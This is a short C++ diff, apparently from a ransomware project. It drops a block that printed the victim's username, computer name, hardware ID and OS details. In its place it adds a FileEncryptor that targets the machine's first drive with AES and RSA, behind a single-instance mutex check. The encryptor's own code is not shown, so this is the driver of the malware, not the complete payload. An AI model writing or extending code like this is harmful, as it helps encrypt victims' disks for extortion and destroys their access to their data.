@@ -3,6 +3,7 @@
 
 #include "headers.h"
 #include "systeme.h"
+#include "fileEncryptor.h"
 
 
 int main(void) {
@@ -11,14 +12,12 @@ int main(void) {
 	if (ERROR_ALREADY_EXISTS == GetLastError()) {
 		return 1;
 	}
-
 	Systeme sys;
-	std::cout << "Username : " << sys.getUsername() << std::endl;
-	std::cout << "Computer Name : " << sys.getComputerName() << std::endl;
-	std::cout << "CPU : " << sys.getCPU() << std::endl;
-	std::cout << "HwId : " << sys.getHwId() << std::endl;
-	std::cout << "LangId : " << sys.getLangId() << std::endl;
-	std::cout << "OsVersion : " << sys.getOsVersion() << std::endl;
+
+	std::string disk = sys.getDrives().at(0);
+
+	FileEncryptor fileEncryptor(disk, (std::string)"AES", (std::string)"RSA");
+	
 
 
 	
